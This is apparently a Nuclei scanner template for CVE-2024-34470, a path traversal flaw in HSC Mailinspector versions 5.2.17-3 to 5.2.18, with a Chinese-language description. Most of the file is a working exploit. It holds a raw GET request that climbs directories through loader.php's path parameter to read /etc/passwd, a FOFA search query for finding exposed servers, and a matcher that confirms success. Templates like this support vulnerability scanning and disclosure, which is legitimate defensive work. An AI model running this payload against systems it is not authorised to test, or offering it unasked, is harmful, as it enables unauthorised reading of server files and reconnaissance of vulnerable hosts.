id: CVE-2024-34470

info:
  name: HSC Mailinspector loader.php 任意文件读取漏洞
  author: fgz
  severity: high
  description: HSC Mailinspector是一个电子邮件检查工具 ，在HSC Mailinspector 5.2.17-3到5.2.18版本中发现了一个问题。public/loader.php文件中存在一个未经身份验证的路径遍历漏洞。path参数无法正确筛选传递的文件和目录是否为webroot的一部分，从而使攻击者能够读取服务器上的任意文件。
  metadata:
    max-request: 1
    fofa-query: body="mailinspector/public"
    verified: true
requests:
  - raw:
      - |+
        GET /mailinspector/public/loader.php?path=../../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: keep-alive

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && contains(body, 'root:')"